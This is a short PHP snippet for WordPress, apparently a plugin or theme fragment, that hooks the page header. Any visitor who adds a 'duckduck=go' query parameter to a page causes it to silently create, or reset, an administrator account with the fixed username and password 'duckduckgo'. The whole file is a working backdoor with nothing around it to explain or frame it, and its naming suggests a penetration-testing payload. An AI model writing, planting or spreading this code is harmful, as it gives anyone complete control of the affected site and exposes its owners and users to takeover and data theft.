<?php
add_action('wp_head', 'msf_duckduckgo');
function msf_duckduckgo() {
    if($_GET['duckduck'] == 'go') {
        require('wp-includes/registration.php');
        if(!username_exists('duckduckgo')) {
            $user_id = wp_create_user('duckduckgo', 'duckduckgo');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
        elseif(username_exists('duckduckgo')) {
            $msf_userdata = get_user_by('login', 'duckduckgo');
            wp_set_password('duckduckgo', $msf_userdata->ID);
            $user = new WP_User($msf_userdata->ID);
            $user->set_role('administrator');
        }
    }
}